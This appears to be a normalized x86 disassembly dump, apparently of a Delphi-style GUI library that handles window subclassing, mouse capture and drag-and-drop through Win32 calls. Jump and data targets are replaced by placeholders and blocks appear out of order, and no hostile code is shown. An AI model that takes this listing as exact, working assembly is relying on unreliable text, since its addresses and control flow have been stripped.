jmp r-xdata
retn
sub_43d1b8
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43d270
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43d2a4
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40445c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43d270
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43d300
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43d4e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c5e4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4044bc
mov eax edi
mov edx esi
call sub_403ff0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d528
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c5e4
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4044bc
mov eax edi
mov edx esi
call sub_403ff0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d594
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov eax ebx
call sub_446be4
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43d640
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41a238
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43d674
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446be4
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43d69c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4027b4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43d674
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43d640
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a0dc
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a2b4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d6f8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41a110
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41a238
mov edx 0x8
call sub_4027d4
inc esi
dec ebx
jne r-xdata
sub_43d72c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_41a238
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43d640
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43d790
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43d7f0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40319c
mov edx esp
mov eax esi
call sub_404200
add esp 0x100
pop esi
pop ebx
retn
sub_43d82c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d8f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43e94c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43e2d4
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d48
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43e2d4
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43e94c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43e2d4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43e94c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43d8fb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460064
call sub_403a54
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43e94c
sub_43d954
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d97e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d9e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d790
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43da10
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403448
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43da3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403448
xor edx edx
sub_43da94
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448808
sub_43dab4
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_4487f0
sub_43dad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d9c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_423578
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42a2d0
mov edx eax
mov eax esi
call sub_4236f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43db3c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_43db6c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d9e4
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43dbc8
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403448
pop edi
pop esi
pop ebp
retn 0x4
sub_43dbec
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43dc10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43dbec
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43dbec
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43dccc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43dd38
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43e188
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43d2a4
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_446be4
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_446be4
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_446be4
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403448
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43dccc
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_446be4
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_446be4
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43ded0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_446be4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_446be4
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43df14
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43d72c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43dd38
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_41a238
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_446be4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43ded0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403448
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4456dc
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43d69c
sub_43e070
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41a294
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41a128
mov edx edi
mov eax [ rw-data ]
call sub_41a0dc
jmp r-xdata
sub_43e0d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43e128
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40445c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43d270
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43e188
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43e128
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43e1b4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43df14
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43e188
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43e0d0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_446be4
mov [ esi ] eax
sub_43e204
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43e0d0
cmp eax 0x1
sbb eax eax
inc eax
sub_43e240
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_445648
test eax eax
je r-xdata
mov eax esi
call sub_445648
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43ec70
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_41a238
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_41a294
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_44565c
mov edi eax
jmp r-xdata
sub_43e2d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43e1b4
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4486c4
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43e204
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43e204
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43ff08
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43e204
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4486ac
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43e240
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403448
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_4487ac
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_4486c4
jmp r-xdata
mov eax [ rw-data ]
call sub_448820
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43ff08
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403448
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403448
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_40800c
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
